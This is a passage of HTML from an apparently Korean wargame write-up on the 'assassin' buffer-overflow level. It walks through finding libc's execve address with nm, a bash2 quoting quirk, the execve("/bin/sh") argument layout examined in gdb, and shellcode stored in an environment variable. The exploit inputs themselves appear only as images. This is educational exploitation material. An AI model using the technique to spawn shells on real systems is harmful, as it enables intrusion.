punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>24번째 줄에서 구한 assassin 파일이 의존하는 libc 공유라이브러리의 주소값을 buffer에 저장하고, 그 buffer를 16진수 형태로(%x) 포인터 execve_offset이 가리키는 곳에 저장한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">29</span>         fp <span class=\"token operator\">=</span> <span class=\"token function\">popen</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/usr/bin/nm /lib/libc.so.6 | /bin/grep __execve | /bin/awk '{print $1}'\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>명령어 nm은 인자로 오는 오브젝트 파일에 포함된 심볼들을 리스트화 시켜 보여준다.\r\n/lib/libc.so.6에 포함된 심볼들을 리스트화 시킨 후 그 결과물 중에서 <code class=\"language-text\">__execve</code>가 포함된 것을 골라 그 첫번째 필드(주소값)를 fp에 저장하고 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">30</span>         <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">,</span> fp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">31</span>         <span class=\"token function\">sscanf</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">,</span> <span class=\"token string\">\"%x\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>execve_offset<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>30, 31번째 줄과 같은 동작을 하고 있다. libc의 execve함수의 주소를 execve_offset이 가리키는 곳에 저장한다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token number\">34</span>         execve_addr <span class=\"token operator\">=</span> lib_addr <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>execve_offset<span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">35</span>         <span class=\"token comment\">// end</span>\r\n<span class=\"token number\">36</span> \r\n<span class=\"token number\">37</span>         <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>ret<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">44</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">38</span>         <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>ret <span class=\"token operator\">!=</span> execve_addr<span class=\"token punctuation\">)</span>\r\n<span class=\"token number\">39</span>         <span class=\"token punctuation\">{</span>\r\n<span class=\"token number\">40</span>                 <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You must use execve!\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">41</span>                 <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n<span class=\"token number\">42</span>         <span class=\"token punctuation\">}</span>\r\n</code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 483px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 43.03030303030303%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAIAAAC9o5sfAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA+UlEQVR42o2Qy27CMBQFCVJ83w/bSXFI+P/frALtDqrOwrvRPePLvt+XZRljrOtaM0SkL83DPRwRAKn1JsyXt+zH/Ta+xtgej8PMEZGI3N3MmCkzI3yapvfy2MbYhrshkQgDADMTMTPP81wKqOo8zx8vL+t6PI5aU1WQMMJFTwBKAYgIRPgk763VzHwNfu5MU7v8hzFuz79Bc2PmAsXMVNXdiElU6cwREX5Tjoiq+npFhZgz85TDRURNEYGYReT6K09Pfpp7r703ETGziDA3RDyzTUspf81299rqNkZrPTPNDaCISNYqIh7BzKJaW81a3f16ncw8IwrAN/LJEvXfLs1dAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/9397e179524d64df50cd4edd7404cfa4/c9b55/0.webp 165w,\n/static/9397e179524d64df50cd4edd7404cfa4/f2908/0.webp 330w,\n/static/9397e179524d64df50cd4edd7404cfa4/30f41/0.webp 483w\"\n              sizes=\"(max-width: 483px) 100vw, 483px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/9397e179524d64df50cd4edd7404cfa4/04c57/0.png 165w,\n/static/9397e179524d64df50cd4edd7404cfa4/d9ecf/0.png 330w,\n/static/9397e179524d64df50cd4edd7404cfa4/77a9e/0.png 483w\"\n            sizes=\"(max-width: 483px) 100vw, 483px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/9397e179524d64df50cd4edd7404cfa4/77a9e/0.png\"\n            alt=\"p_execve\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 7.2727272727272725%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAABCAIAAABR8BlyAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAOElEQVR42k3IMQ7AMAgDwEq4YMhkMTRDw/+f2bU33nXOu/cjqbslrVUk3Z1kRGSmmf0HQFXhxsx8YUQCwNux3owAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/7be6d40a8f43e0a32a8920b95a3d1d7c/c9b55/1.webp 165w,\n/static/7be6d40a8f43e0a32a8920b95a3d1d7c/f2908/1.webp 330w,\n/static/7be6d40a8f43e0a32a8920b95a3d1d7c/ff4b8/1.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/7be6d40a8f43e0a32a8920b95a3d1d7c/04c57/1.png 165w,\n/static/7be6d40a8f43e0a32a8920b95a3d1d7c/d9ecf/1.png 330w,\n/static/7be6d40a8f43e0a32a8920b95a3d1d7c/32056/1.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/7be6d40a8f43e0a32a8920b95a3d1d7c/32056/1.png\"\n            alt=\"exploit_test\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>여기서 주의해야 할 점이 있다. bash2에 \\0a를 \\00으로 인식하는 오류가 있어 위와 같이 입력하면 \\x9d까지를 인자로 인식한다. <code class=\"language-text\">~~~</code> 부분을 아래와 같이 “”로 감싸주어야 한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.121212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAASElEQVR42o3JsQ3AMAgEQBAQ/okUi8LuvP+akZwFcu3JWmuMB8B1VDEzIwJARJBw96/yMDMSZrb3lu6uuwCAdHf5QVVFZM75AtwlAtwRJBNZAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/90b69cadae438da2bfbf63d374d2106a/c9b55/2.webp 165w,\n/static/90b69cadae438da2bfbf63d374d2106a/f2908/2.webp 330w,\n/static/90b69cadae438da2bfbf63d374d2106a/ff4b8/2.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/90b69cadae438da2bfbf63d374d2106a/04c57/2.png 165w,\n/static/90b69cadae438da2bfbf63d374d2106a/d9ecf/2.png 330w,\n/static/90b69cadae438da2bfbf63d374d2106a/32056/2.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/90b69cadae438da2bfbf63d374d2106a/32056/2.png\"\n            alt=\"exploit_test2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>“You must use execve!”가 뜨지 않는 것을 보아 무사히 execve의 주소값이 입력이 된 것을 알 수 있다.\r\nexecve 함수는 세 가지 인자를 갖는다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token keyword\">int</span> <span class=\"token function\">execve</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>filename<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> argv <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token keyword\">const</span> envp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>/bin/sh을 실행시키기 위해서 아래와 같이 인자가 들어가야 할 것이다.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\">\r\n<span class=\"token function\">execve</span><span class=\"token punctuation\">(</span>“<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh”<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>“<span class=\"token operator\">/</span>bin<span class=\"token operator\">/</span>sh”<span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\r\n</code></pre></div>\n<p>문제는 execve의 두번째 인자값으로 오는 {“/bin/sh”, NULL}을 어떻게 처리하느냐이다. 이를 확인하기 위해 다음과 같은 프로그램을 작성하고 이를 gdb로 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 394px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.30303030303031%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABWUlEQVR42p2SUW/rIAyFE7AdbJKQJkAIIa00aa/7/z9vYtWqruu2q3ueMJJ95M+nOV6Py/lSSklbyjnnfV9j6Pu+lH0YehEZhjHG6IMfnSPE5l4vby855XKUvh9KKTlvIXgWab6pbdvHL2utYSMsgMjM1goL44PDT3LT5Jyb59m58TTPImytXfwyuvGJ1YNCCMuypLR6750bQYMxnTEGCYnIMLMIMyulkMhaK7U0APBldIhrCH7xy+Vy2N4i0TRNKVWKW946QjdN53PZy75tq4g8NMdy7HvJIfim/aeVmxsbAOy6DgC01veEr3paNgigARBBKaW1Vq1SqgWs+pNXczqdrrRjDHnPzo3e+21Lzjml2g+3zyPX1w/zfKXlRSpdIkJEw2y67jfn2xpIxFzjMQxDXNc1rSmtMca+ryENoWaW2TwP3Y0cIhDRlRx8SGtdL490z/JLz3/oHVbXFkq8LydRAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/b019a4fe86513618f2d87381a7625006/c9b55/3.webp 165w,\n/static/b019a4fe86513618f2d87381a7625006/f2908/3.webp 330w,\n/static/b019a4fe86513618f2d87381a7625006/47f09/3.webp 394w\"\n              sizes=\"(max-width: 394px) 100vw, 394px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/b019a4fe86513618f2d87381a7625006/04c57/3.png 165w,\n/static/b019a4fe86513618f2d87381a7625006/d9ecf/3.png 330w,\n/static/b019a4fe86513618f2d87381a7625006/cc097/3.png 394w\"\n            sizes=\"(max-width: 394px) 100vw, 394px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/b019a4fe86513618f2d87381a7625006/cc097/3.png\"\n            alt=\"testargv.c\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 475px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 66.66666666666666%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB0ElEQVR42mVS2Y7kIBCDdBLCGcJNcWVm/v8fV3T37rS0fkPC5bLLKARfak05h+BD8NYaY01K0XunlKKUPp/JOiel5JxTSpcFoxfG150hhRj7Pfro13UxxoQQbIJyxgghSikhBPofpdWUo7E2xAAFhBCUUsaYsUbr01nrnaVzxI4xxgt+4U2urfUxMoBxdtzDWrtvG8ZLbXXf91Pr++4pRaXkp+SbnwGm55QuYzJk5zzZd4SQ825dVyllbbX3HmMQUnBG52rH8U+5llonLfhxDx/CcRCMlwyZcSaVGvd4foDa6vfPz/j+KrX03qTgKEOurYUQ9HUBgI9BcIYx9t7vhAghWmu1tVILFMg5l1a9d9YaehBUa62txhitd2OMmJIUAmMMAJzz8zxba1xwchAhJWd0feK9NhSorWXIxhoAiDEKzhFCIcbjoFJJgJxymjdn9Pjr9h1YqeUZWLTOtd6mshQI4ZTiuq6nPvvorXdrzLIs275t2/Yb+ks55Zk2FAgxvvoQU5RSEkL0dWmtKaVSqlMpxthHSWqprcU0e9J6m2Q5PYcQGGMYoXVdH0/8Wv0gzyPHFHOZB3B+1vuxLFLKx+NxHERrfZ4n51xrvSzLJ/kPhVUtlWsN7LIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/c054dbf251db188b67a73b2b6d9c4746/c9b55/4.webp 165w,\n/static/c054dbf251db188b67a73b2b6d9c4746/f2908/4.webp 330w,\n/static/c054dbf251db188b67a73b2b6d9c4746/4287c/4.webp 475w\"\n              sizes=\"(max-width: 475px) 100vw, 475px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/c054dbf251db188b67a73b2b6d9c4746/04c57/4.png 165w,\n/static/c054dbf251db188b67a73b2b6d9c4746/d9ecf/4.png 330w,\n/static/c054dbf251db188b67a73b2b6d9c4746/466da/4.png 475w\"\n            sizes=\"(max-width: 475px) 100vw, 475px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/c054dbf251db188b67a73b2b6d9c4746/466da/4.png\"\n            alt=\"gdb\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>보통 함수가 실행되기 직전에 인자를 eax로 받으므로 bp를 0x80483eb에 걸고 이 때의 eax를 조사해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 379px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 84.84848484848484%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAIAAABSJhvpAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAB/ElEQVR42pVS227dIBD0BQwGlosxd7B9EilqpPQz+v+/VNknTROlStsRD2OLWWZnt8ul5JIlCK1Vyjnl1Fpb7YIQJoQghPp36Lr+w2dpbd+34J1SCk8T45xzZlerjXHecc66L9D2rbWqtaaUMsa4EIwxhNCdCMFBAr8AABjjiwouOMa4O+9zBgCcM6WkMUYphRDSWiulpJTaaJASQJjFYISkVFprs2hCSLdYu67WaC0l4GnCGC/LYoxZrJUSKKUC4O4LjeMn29t+ux0pxRSD8z6nRMiEJzxfIIRM00TIhNA4nuKPgdXW2tZ8CDF6AEAIAYhcsnPOrqtZzFeB1a3VVmMMp3mz1FrPeZUipZznGQDmee66bpqmizMhzl5exbmUlKJzznknQJaS83lKTPFMUXBKSdf1hBIAIITOM6OEvvW8bVuLl54LkXOOIaSc7BnYmSzn/N6htTaklHL2wY/DcIpLa7WV43azq51nFlOKIcSUnFtLbbkWH/xM6TCix8eHb8/PL99fHh4f0HiJa6ul5v04vFsZY+FCKmf5GJMP/ixKad8Pzq12teL9zp2B1bIfe4p+uMz0fS+lvAbT/VrpV7znV2C1lpK3Yw/eDf1w/6mUuhf6C8rd9r6nFN4EWuvx8z79SXzO+Xg6Uv4tllL+08ux5LRG9GNEHnf/iZ84GC0/aXFaVQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/184322a79ebd5e7ba0725eaeb62c0dc9/c9b55/5.webp 165w,\n/static/184322a79ebd5e7ba0725eaeb62c0dc9/f2908/5.webp 330w,\n/static/184322a79ebd5e7ba0725eaeb62c0dc9/8a4f3/5.webp 379w\"\n              sizes=\"(max-width: 379px) 100vw, 379px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/184322a79ebd5e7ba0725eaeb62c0dc9/04c57/5.png 165w,\n/static/184322a79ebd5e7ba0725eaeb62c0dc9/d9ecf/5.png 330w,\n/static/184322a79ebd5e7ba0725eaeb62c0dc9/811d1/5.png 379w\"\n            sizes=\"(max-width: 379px) 100vw, 379px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/184322a79ebd5e7ba0725eaeb62c0dc9/811d1/5.png\"\n            alt=\"memory\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>eax는 0xbffffb00이라는 주소지를 담고 있으며, 이 주소지는 다시 0x80484a0이라는 주소지를 담고 있고, 0x80484a0으로 가야 비로소 문자열들을 발견할 수 있다. 이번에는 tmp[1]의 “BBBBBBBB” 대신 NULL을 넣고 위의 과정을 반복해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 339px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 80.60606060606061%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAIAAACZeshMAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABo0lEQVR42pWSCY7cIBBFMWuBweBmq3K3nY4UzcVy/ztEtCezSZmZPCGrZBl98z5s2+j4sV9vt+vtRoTYEYk2Ij/PSLhdyT9IKSJi77315r2fpokxxu73OxLux15bCyHsx9E71lpDCIyx549OHvO7N623dV1LrTEl51wpOecc1xSCZ1+iHmitjdFaK7AglTRGO+eMMVLKaWJv1zuu16313nD8eb5cOqJzDgBow5QiAHyWnFJ0zuVSUkqtVW20Usr72RgjhNBaxzXFNFZaVwAAa9O6WgDOOXtxoLW+/7znfCklPz39WtekByaXQtuGREgEAPPsay3L4rngp8bx0Ebf9tHWthFSF0J8S9g5cMFHocGDBa31SyXTG86kV23fSvi3sLTEtMSllBxCqK262Xk/I/UYh8vPNgOAAVBKLctChDlfvPcxLqXm0fvfQ32BMWbbaDQ3O2stADjnrHMxJWvtx+vxgWma5GBELUtA7ERUW9v3veM4AgAcx55zTilJJc9Exh6FPXbKF4tKKSkk51xwLuUYOOfnFRJCPps3vzWrr5X8l+0/QnYdM4ZX/GcAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/55b95ca7fc71792df37a7c69fe6b3142/c9b55/6.webp 165w,\n/static/55b95ca7fc71792df37a7c69fe6b3142/f2908/6.webp 330w,\n/static/55b95ca7fc71792df37a7c69fe6b3142/d6e88/6.webp 339w\"\n              sizes=\"(max-width: 339px) 100vw, 339px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/55b95ca7fc71792df37a7c69fe6b3142/04c57/6.png 165w,\n/static/55b95ca7fc71792df37a7c69fe6b3142/d9ecf/6.png 330w,\n/static/55b95ca7fc71792df37a7c69fe6b3142/16caa/6.png 339w\"\n            sizes=\"(max-width: 339px) 100vw, 339px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/55b95ca7fc71792df37a7c69fe6b3142/16caa/6.png\"\n            alt=\"testargv.c_2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 418px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 14.545454545454545%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAbklEQVR42pXFMQ7DIAwAQGikUAUZAyYmAkOA/z8yQ5auveVUqUVald5FaimlNaEY83WNcXt06UwAwDkzc+LT2oOIKCUi+hqjxpxrrTGn9+gQvUdrD4cYQti2DwAgYoxk9l390G+99yYCAFpr9acHbggIvH7qoIoAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/08b16a0533e208a4e3cdc95fa329e8ed/c9b55/7.webp 165w,\n/static/08b16a0533e208a4e3cdc95fa329e8ed/f2908/7.webp 330w,\n/static/08b16a0533e208a4e3cdc95fa329e8ed/cd572/7.webp 418w\"\n              sizes=\"(max-width: 418px) 100vw, 418px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/08b16a0533e208a4e3cdc95fa329e8ed/04c57/7.png 165w,\n/static/08b16a0533e208a4e3cdc95fa329e8ed/d9ecf/7.png 330w,\n/static/08b16a0533e208a4e3cdc95fa329e8ed/d7398/7.png 418w\"\n            sizes=\"(max-width: 418px) 100vw, 418px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/08b16a0533e208a4e3cdc95fa329e8ed/d7398/7.png\"\n            alt=\"testargv\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 376px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 72.12121212121212%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAIAAACgpqunAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABvklEQVR42n2S2ZLjIAxFvQSwWYRBgFmEne7//8gpJzNTSVdmzgMPKt3SvUJDrvW8HyFgSqm21qgdR7cWwFq7WWO0854LscpVKbltm0PcLAxP+nmc5xEDBsSY4p5zraXWYoxx3islh//QOh33A71TUs7zzC+YUkppDQDrurw2j+P4Jn4MyoheG+W8Q0TvPbsx5zZ7ubQxRue9c3bf0yKEcy6EEGJQSg1cCMHFui7LIjhnnHOppOBcPViWRUqplGacCcGnabrd2MMdn+d5qES9076nGIMBMGBiDN47DNFtVkoJ1oYYpZScsQ+Zz/tZSo4xOOcR/W2eueBcCKW0lOvfnOMLf8RE1JtHpNYArFISQzjvZyXatg0A3rp/0HunTqWUEIOUqrWWS077jugBwG6bMWaapmEYEXEvubZWamG329P2Jb5/f8UY1nXNFzv1vu/X24hijErKYRhrrdR7SpEL8dtL60Sd+nHsOTPG5gfOOcHFj5Af/DeiRvX8uueS53l6FrXW1098Ynw9ldIa9ZZSyjlro6+QAN77f4nfF3aex3mUUmKKxhgiqrU2alprsPaxcMOvCxEYvAFARADzFP8CG/cn5DL79/UAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/1ad885f48db8be4acad586136ce3fec4/c9b55/8.webp 165w,\n/static/1ad885f48db8be4acad586136ce3fec4/f2908/8.webp 330w,\n/static/1ad885f48db8be4acad586136ce3fec4/f1608/8.webp 376w\"\n              sizes=\"(max-width: 376px) 100vw, 376px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/1ad885f48db8be4acad586136ce3fec4/04c57/8.png 165w,\n/static/1ad885f48db8be4acad586136ce3fec4/d9ecf/8.png 330w,\n/static/1ad885f48db8be4acad586136ce3fec4/d38a6/8.png 376w\"\n            sizes=\"(max-width: 376px) 100vw, 376px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/1ad885f48db8be4acad586136ce3fec4/d38a6/8.png\"\n            alt=\"memory2\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p>gdb에서 0x80484a8자리가 null이기 때문에 gdb에서는 문자열로 잡지 못하나, 위에서 프로그램을 실행시켰을 시 null이라고 뜨는 것을 보아 프로그램은 null을 분명히 인식하는 것을 알 수 있다. 쉘코드를 환경변수로 준 후, 주소지를 확인해 보았다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 413px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.121212121212121%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAIAAADXZGvcAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAYklEQVR42jXIQQ4DIQgAQA91AYmbJgVFlNX/v7LpoXOcZD7W8hUxl/fe53SRj6jss993jSdaU9G2z4mIZ28zY+a7ViJKNob7UFVEQEQiuq4MAMyc84uoIGL+DXIpSAQA6e8LU5sHjqAQUBYAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/e5a95408665a433149a123ab53dcfc96/c9b55/9.webp 165w,\n/static/e5a95408665a433149a123ab53dcfc96/f2908/9.webp 330w,\n/static/e5a95408665a433149a123ab53dcfc96/f2c1b/9.webp 413w\"\n              sizes=\"(max-width: 413px) 100vw, 413px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/e5a95408665a433149a123ab53dcfc96/04c57/9.png 165w,\n/static/e5a95408665a433149a123ab53dcfc96/d9ecf/9.png 330w,\n/static/e5a95408665a433149a123ab53dcfc96/6c1e7/9.png 413w\"\n            sizes=\"(max-width: 413px) 100vw, 413px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/e5a95408665a433149a123ab53dcfc96/6c1e7/9.png\"\n            alt=\"printenv\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    